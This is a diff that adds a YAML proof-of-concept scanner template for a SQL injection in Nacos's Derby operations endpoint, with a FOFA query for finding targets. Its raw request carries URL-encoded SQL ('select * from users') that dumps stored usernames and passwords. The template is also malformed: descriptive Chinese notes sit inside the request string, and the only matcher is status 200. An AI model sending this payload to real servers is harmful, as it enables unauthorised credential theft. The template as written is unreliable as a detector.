@@ -1,0 +1,34 @@
+id: poc-lb2hbmoxtb4s7cgw
+info:
+  name: Nacos Derby SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lb2hbmoxtb4s7cgw'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lb2hbmoxtb4s7cgw
+    fofa: app="nacos"
+http:
+- raw:
+  - 'GET /nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?USERNAME)(?=.*?PASSWORD).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
